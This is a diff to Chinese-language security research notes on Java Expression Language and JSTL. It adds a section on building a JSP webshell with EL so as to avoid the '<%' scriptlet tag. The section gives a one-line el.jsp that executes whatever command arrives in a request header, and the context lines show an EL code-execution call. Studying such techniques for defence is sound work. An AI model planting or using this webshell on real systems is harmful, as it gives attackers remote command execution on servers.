@@ -99,6 +99,7 @@ ${ELTest:Exec("calc")}
 
 ### JSTL
 **简介**
+
 JSP Standard Tag Library JSP 标准标签库，JSP 为开发者提供的⼀系列的标签，使⽤这些标签可以完成
 ⼀些逻辑处理，⽐如循环遍历集合，让代码更加简洁，不再出现 JSP 脚本穿插的情况。
 实际开发中 EL 和 JSTL 结合起来使⽤，JSTL 侧重于逻辑处理，EL 负责展示数据。
@@ -120,6 +121,21 @@ JSP Standard Tag Library JSP 标准标签库，JSP 为开发者提供的⼀系�
 ![image](https://user-images.githubusercontent.com/55024146/159132587-8ded391a-604e-43a2-87c9-d5696b506df8.png)
 
 
+利用研究
+---
+
+### JSP + EL构造 Webshell（规避 <%）
+
+![image](https://user-images.githubusercontent.com/55024146/179147020-e4ce602e-640b-44ab-a431-2056677474b3.png)
+
+`el.jsp`
+
+```
+${Runtime.getRuntime().exec(header.cmd)}
+```
+测试效果
+
+![image](https://user-images.githubusercontent.com/55024146/179147643-956c3938-e89f-4368-b8cd-c54021aad5e3.png)
 
 
 
